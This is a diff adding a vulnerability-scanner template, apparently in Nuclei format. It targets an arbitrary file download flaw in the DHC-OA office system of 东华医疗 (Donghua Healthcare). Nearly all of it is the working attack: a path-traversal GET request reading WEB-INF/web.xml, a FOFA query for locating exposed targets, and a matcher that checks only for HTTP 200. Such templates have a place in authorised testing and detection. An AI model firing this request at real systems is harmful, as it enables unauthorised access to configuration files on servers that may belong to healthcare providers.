@@ -1,0 +1,21 @@
+id: poc-gprv6vy1sconwoog
+info:
+  name: 东华医疗协同办公系统templateFile存在任意文件下载漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gprv6vy1sconwoog'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gprv6vy1sconwoog
+    fofa: product="DHC-OA"
+http:
+- raw:
+  - 'GET /common/templateFile?template_name=../../WEB-INF/web.xml HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
